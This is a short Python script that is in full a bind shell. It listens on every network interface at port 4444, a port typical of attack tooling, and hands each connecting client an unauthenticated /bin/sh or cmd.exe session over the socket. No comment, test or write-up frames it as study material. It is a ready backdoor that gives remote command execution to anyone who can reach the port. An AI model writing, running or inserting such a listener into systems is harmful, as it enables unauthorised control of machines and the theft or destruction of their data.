import os
import socket
import subprocess
import sys
import threading

HOST = "0.0.0.0"
PORT = 4444


def _shell_command():
    if os.name == "nt":
        return ["cmd.exe"]
    return ["/bin/sh"]


def handle_client(client_socket):
    process = None
    try:
        process = subprocess.Popen(
            _shell_command(),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=False,
        )

        def forward_output(src, dst):
            try:
                while True:
                    data = src.read(1024)
                    if not data:
                        break
                    dst.sendall(data)
            except (OSError, BrokenPipeError):
                pass
            finally:
                try:
                    src.close()
                except OSError:
                    pass

        threading.Thread(target=forward_output, args=(process.stdout, client_socket), daemon=True).start()
        threading.Thread(target=forward_output, args=(process.stderr, client_socket), daemon=True).start()

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            if process.stdin and not process.stdin.closed:
                process.stdin.write(data)
                process.stdin.flush()
    except (OSError, ValueError) as e:
        print(f"Client handler error: {e}", file=sys.stderr)
    finally:
        if process is not None:
            try:
                if process.stdin and not process.stdin.closed:
                    process.stdin.close()
            except OSError:
                pass
            try:
                process.terminate()
                process.wait(timeout=5)
            except (OSError, subprocess.TimeoutExpired):
                try:
                    process.kill()
                except OSError:
                    pass
        try:
            client_socket.close()
        except OSError:
            pass


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"Listening on {HOST}:{PORT}", file=sys.stderr)

    try:
        while True:
            try:
                client_socket, addr = server.accept()
                print(f"Connection from {addr}", file=sys.stderr)
                client_thread = threading.Thread(target=handle_client, args=(client_socket,), daemon=True)
                client_thread.start()
            except OSError as e:
                print(f"Accept failed: {e}", file=sys.stderr)
                break
    finally:
        server.close()


if __name__ == "__main__":
    main()